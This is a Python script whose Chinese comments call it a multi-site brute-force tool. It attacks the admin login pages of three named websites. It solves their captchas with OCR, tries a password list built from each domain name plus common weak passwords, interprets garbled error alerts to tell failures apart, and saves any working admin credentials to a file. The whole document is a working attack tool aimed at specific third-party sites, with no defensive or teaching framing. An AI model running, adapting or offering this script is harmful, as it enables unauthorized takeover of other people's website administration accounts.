#!/usr/bin/env python3
"""multi_asp_bf2.py - 多站爆破v2 (修正判定: 识别乱码alert错误)
乱码alert特征: '楠璇'=验证码错, 'ㄦ峰瀵璇'/'瀵璇'=用户名或密码错
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'

SITES = [
    ('www.yangsha.com', 'A', '/GetCode.asp', '/admin/login.asp?action=check'),
    ('szsadwj.com', 'B', '/admin/inc/checkcode.asp', '/admin/Admin_ChkLogin.asp'),
    ('gdcq119.com', 'B', '/admin/inc/checkcode.asp', '/admin/Admin_ChkLogin.asp'),
]

def make_pwlist(dom):
    base = dom.split('.')[0].replace('www', '')
    variants = [base, base + '123', base + '888', 'admin' + base, base + '2023', base + '2024', base + '666', base + '123456']
    common = ["admin", "admin123", "123456", "admin888", "12345678", "password",
              "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
              "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
              "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
              "123456789", "1qaz2wsx", "qwe123", "admin000", "admin001", "a12345678"]
    return list(dict.fromkeys(variants + common))

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(40000)
    except Exception:
        return b''

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def crack_site(site):
    dom, tpl, cap_path, login_path = site
    get_cap_url = HOST + ('/getcap2.php?d=' if tpl == 'A' else '/getcap_sz.php?d=') + urllib.parse.quote(dom)
    cap_img_url = HOST + ('/ys_cap2.jpg' if tpl == 'A' else '/sz_cap.jpg')
    login_url = HOST + ('/loginpost2.php?d=' if tpl == 'A' else '/login_sz.php?d=') + urllib.parse.quote(dom)
    pws = make_pwlist(dom)
    print('[%s] starting %d passwords' % (dom, len(pws)), flush=True)
    for pw in pws:
        for attempt in range(8):
            out = fetch(get_cap_url)
            if b'SAVED:' not in out:
                time.sleep(2)
                continue
            img = fetch(cap_img_url)
            if not img or len(img) < 50:
                time.sleep(2)
                continue
            try:
                c1 = ocr.classification(img)
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 120 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception:
                break
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            if tpl == 'A':
                out = fetch(login_url + '&p=' + urllib.parse.quote(pw) + '&c=' + code)
            else:
                out = fetch(login_url + '&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
            idx = out.find(b'GIF89a')
            body = out[idx+6:] if idx > 0 else out
            try:
                text = body.decode('gb2312', 'ignore')
            except Exception:
                text = ''
            # 乱码alert判定
            if '楠璇' in text or '确认码' in text or '不一致' in text:
                continue  # 验证码错
            if 'ㄦ峰瀵璇' in text or '瀵璇' in text or '错误' in text or '失败' in text or '不存在' in text or '密码' in text:
                time.sleep(1)
                break  # 密码/用户错
            # 空响应: 必须重试确认(排除网络抖动)
            if len(body) == 0:
                time.sleep(1.5)
                out2 = fetch(login_url + ('&p=' if tpl == 'A' else '&u=admin&p=') + urllib.parse.quote(pw) + '&c=' + code)
                idx2 = out2.find(b'GIF89a')
                body2 = out2[idx2+6:] if idx2 > 0 else out2
                text2 = body2.decode('gb2312', 'ignore') if body2 else ''
                if '楠璇' in text2 or '确认码' in text2:
                    continue
                if len(body2) == 0:
                    return ('HIT', dom, 'admin', pw, 'empty-resp')
                text = text2
            # 成功标志
            if '管理' in text or '欢迎' in text or '成功' in text or 'logout' in text.lower():
                return ('HIT', dom, 'admin', pw, 'body')
            print('[%s] CHECK %s: %s' % (dom, pw, text[:70].replace(chr(10), ' ')), flush=True)
            time.sleep(1)
            break
    return ('DONE', dom, 'nohit')

def main():
    hits = []
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(crack_site, s): s for s in SITES}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception as e:
                r = ('ERR', repr(e)[:80])
            print('RESULT:', r, flush=True)
            if r[0] == 'HIT':
                hits.append(r)
    print('=== ALL DONE: %d hits ===' % len(hits), flush=True)
    for h in hits:
        print('HIT:', '\t'.join(str(x) for x in h), flush=True)
    with open('/tmp/multi_asp2_hits.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(str(x) for x in h) + '\n')

if __name__ == '__main__':
    main()
